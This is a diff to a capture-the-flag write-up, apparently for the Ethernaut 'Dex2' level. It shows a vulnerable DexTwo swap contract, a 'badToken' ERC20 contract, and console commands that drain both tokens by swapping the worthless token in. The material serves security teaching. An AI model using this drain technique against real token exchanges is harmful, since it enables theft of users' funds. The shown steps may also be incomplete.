@@ -1,12 +1,12 @@
-# Level 22 - Dex
+# Level 23 - Dex2
 
 ### Objective
 
 The objective of this level is as follows:
 
-1. The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.
-2. You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.
-3. You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.
+1. This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way.
+2. You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.
+3. You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.
 
 ### Contract
 
@@ -19,7 +19,7 @@ import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import '@openzeppelin/contracts/math/SafeMath.sol';
 import '@openzeppelin/contracts/access/Ownable.sol';
 
-contract Dex is Ownable {
+contract DexTwo is Ownable {
   using SafeMath for uint;
   address public token1;
   address public token2;
@@ -30,26 +30,25 @@ contract Dex is Ownable {
     token2 = _token2;
   }
 
-  function addLiquidity(address token_address, uint amount) public onlyOwner {
+  function add_liquidity(address token_address, uint amount) public onlyOwner {
     IERC20(token_address).transferFrom(msg.sender, address(this), amount);
   }
 
   function swap(address from, address to, uint amount) public {
-    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
     require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
-    uint swapAmount = getSwapPrice(from, to, amount);
+    uint swapAmount = getSwapAmount(from, to, amount);
     IERC20(from).transferFrom(msg.sender, address(this), amount);
     IERC20(to).approve(address(this), swapAmount);
     IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
   }
 
-  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
+  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
     return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
   }
 
   function approve(address spender, uint amount) public {
-    SwappableToken(token1).approve(msg.sender, spender, amount);
-    SwappableToken(token2).approve(msg.sender, spender, amount);
+    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
+    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
   }
 
   function balanceOf(address token, address account) public view returns (uint){
@@ -57,9 +56,9 @@ contract Dex is Ownable {
   }
 }
 
-contract SwappableToken is ERC20 {
+contract SwappableTokenTwo is ERC20 {
   address private _dex;
-  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
+  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
         _mint(msg.sender, initialSupply);
         _dex = dexInstance;
   }
@@ -73,18 +72,33 @@ contract SwappableToken is ERC20 {
 
 ### Solution
 
-Solution inspired by [this_post](https://medium.com/@this_post):
+Solution inspired by [Naveen](https://dev.to/nvn):
 
 ```
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
-import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.1.0/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 
 contract badToken is ERC20 {
-    constructor () public ERC20("Badicious", "BAD") {
-        _mint(msg.sender, 1000000 * (10 ** uint256(decimals())));
+    constructor(uint256 initialSupply) ERC20("Badicious", "BAD") {
+        _mint(msg.sender, initialSupply);
     }
 }
+```
+
+Get the token addresses:
+
+```
+badTokens = '<BAD-token-address>'
+t1 = await contract.token1()
+t2 = await contract.token2()
+```
+
+Drain all tokens from `token1` and `token2`:
+
+```
+await contract.swap(badTokens, t1, 100)
+await contract.swap(badTokens, t2, 200)
 ```
 
 Done!
